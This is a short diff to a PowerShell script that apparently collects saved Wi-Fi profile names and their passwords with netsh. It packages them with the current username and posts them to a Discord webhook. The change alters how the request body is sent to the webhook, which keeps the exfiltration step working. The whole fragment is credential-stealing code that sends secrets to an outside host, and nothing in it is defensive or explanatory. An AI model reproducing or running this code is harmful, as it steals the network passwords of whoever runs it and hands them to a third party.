@@ -9,13 +9,8 @@ netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEac
 		'username' = $env:username + " | " + [string]$wlan
 		'content' = [string]$passw
 	}
-
-	$payload = [PSCustomObject]@{
-		content = $Body
-	}
-
 	
-	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($payload | ConvertTo-Json)
+	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
 
 	
 }
